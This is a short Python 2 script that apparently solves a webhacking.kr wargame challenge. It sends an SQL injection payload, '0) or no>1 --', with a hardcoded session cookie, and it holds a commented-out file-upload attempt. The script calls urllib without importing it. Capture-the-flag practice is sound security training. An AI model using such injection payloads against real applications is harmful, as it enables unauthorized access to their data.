#-*- coding: utf-8 -*-
import urllib2
import requests
import CookieManager


challengeUrl = "http://webhacking.kr/challenge/web/web-14/index.php"

CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")

parameter = urllib.quote("0) or no>1 --")
httpRequest = urllib2.Request(challengeUrl + "?no=" + parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())

httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()

"""
uploadFile = {
    "upfile": open(".project", "rb")
}

sessionCookie = {
    "PHPSESSID": "a90f69bdc1cdceaf479ca1ebcd368d29"
}

httpConnection = None
try:
    print CookieManager.getCookie()
    httpRequest = requests.post(challengeUrl, files=uploadFile, cookies=sessionCookie)
    #httpRequest.add_header("Cookie", CookieManager.getCookie())
    #httpConnection = urllib2.urlopen(httpRequest)
    #httpResponse = httpConnection.read()
    print httpRequest.text
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
"""